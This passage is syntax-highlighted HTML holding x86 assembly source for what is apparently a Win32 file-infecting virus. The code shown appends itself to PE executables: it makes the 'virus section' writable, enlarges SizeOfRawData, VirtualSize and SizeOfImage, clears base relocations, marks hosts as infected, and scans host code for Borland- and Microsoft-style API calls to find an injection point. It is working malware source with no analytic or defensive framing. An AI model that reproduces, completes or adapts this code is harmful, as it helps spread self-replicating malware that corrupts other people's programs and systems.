        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">               
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">entry_point</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_sh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_sh</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Set read/write access on virus section</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_Characteristics</span><span class="sc4">],</span><span class="sc0">          \
                 </span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Dont share virus section</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_Characteristics</span><span class="sc4">],</span><span class="sc0">         \
                   </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_SHARED</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Update SizeOfRawData</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vir_offset</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">decryptor_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">inf_size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fix_size</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">RawSizeOk</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;If we changed SizeOfRawData round up to nearest</span><span class="sc0">
        </span><span class="sc1">;file alignment</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">raw_align</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_Characteristics</span><span class="sc4">],</span><span class="sc0">        \
                </span><span class="sc5">IMAGE_SCN_CNT_INITIALIZED_DATA</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">RawSizeOk</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_SizeOfInitializedData</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Update VirtualSize</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">RawSizeOk</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fix_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">size_virtual</span><span class="sc4">-</span><span class="sc5">inf_size</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">VirtualSizeOk</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Update SizeOfImage</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">VirtualSizeOk</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_SectionAlignment</span><span class="sc4">]</span><span class="sc0">                
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_SizeOfImage</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Clear BASE RELOCATION field</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc0">                 \
                   </span><span class="sc5">OH_DataDirectory</span><span class="sc4">+</span><span class="sc0">            \
                   </span><span class="sc5">DE_BaseReloc</span><span class="sc4">+</span><span class="sc0">            \
                                   </span><span class="sc5">DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Mark file as infected and optimize file size</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnmapClose</span><span class="sc0">
                
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; dwMoveMethod</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; lpDistanceToMoveHigh</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fix_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZE_PADDING</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; lDistanceToMove</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">h_CreateFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; hFile</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_SetFilePointer</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFFFFFFh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">cant_resize</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; hFile</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_SetEndOfFile</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumInfected</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">cant_resize</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">HandleClose</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Close file mapping</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">inf_close_file</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnmapClose</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">HandleClose</span><span class="sc0">
</span><span class="sc5">inf_file_err</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Scan host code</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:</span><span class="sc0">
</span><span class="sc1">;               ebx -&gt; Memory image base address</span><span class="sc0">
</span><span class="sc1">;Exit:</span><span class="sc0">
</span><span class="sc1">;               ecx -&gt; Inject point offset in file</span><span class="sc0">
</span><span class="sc1">;                      or NULL if error</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">ApeIt</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileImport</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RAW</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImportSH</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_code_sh</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">ExitApe</span><span class="sc0">
    
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_ImageBase</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">host_base</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc1">;Entry-point RAW</span><span class="sc0">
                
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                
</span><span class="sc5">search_call</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0"> </span><span class="sc1">;Api call generated by Borland Linker?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">try_borland</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0"> </span><span class="sc1">;Api call generated by Microsoft Linker?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">try_microsoft</span><span class="sc0">

</span><span class="sc5">err_api_call</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">search_call</span><span class="sc0">
</span><span class="sc5">ExitApe</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">try_borland</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Go to refered address</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;Convert to rva</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">err_api_call</span><span class="sc0">             </span><span class="sc1">;Below code?</span><span class="sc0">
                
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">err_api_call</span><span class="sc0">            </span><span class="sc1">;Above code?</span><span class="sc0">
                
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">00000002h</span><span class="sc4">],</span><span class="sc2">25FFh</span><span class="sc0">  </span><span class="sc1">;JMP DWORD PTR [xxxx]</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">err_api_call</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">host_base</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Get a RVA again</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImportSH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">err_api_call</span><span class="sc0">             </span><span class="sc1">;Below imports?</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">err_api_call</span><span class="sc0">            </span><span class="sc1">;Above imports?</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImportSH</span><span class="sc4">]</span><span class="sc0">
